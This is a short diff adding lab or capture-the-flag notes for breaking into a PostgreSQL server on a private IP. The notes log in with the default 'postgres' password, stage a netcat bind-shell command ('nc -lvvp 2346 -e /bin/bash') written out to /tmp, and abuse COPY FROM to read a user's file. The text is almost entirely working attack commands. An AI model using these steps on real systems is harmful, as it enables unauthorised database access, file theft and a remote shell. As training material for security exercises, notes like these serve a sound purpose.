@@ -1,0 +1,15 @@
+use the github repo
+
+or
+
+psql -h 192.168.188.47 -p 5437 -U postgres      // pasword postgres deafualt
+
+```
+CREATE TABLE pingback (t TEXT);
+INSERT INTO pingback(t) VALUES('nc -lvvp 2346 -e /bin/bash');
+SELECT * FROM pingback;
+COPY pingback(t) TO '/tmp/pingback';
+CREATE TABLE temp(t TEXT);
+COPY temp FROM '/home/wilson/local.txt';
+SELECT * FROM temp limit 30 offset 0;
+```
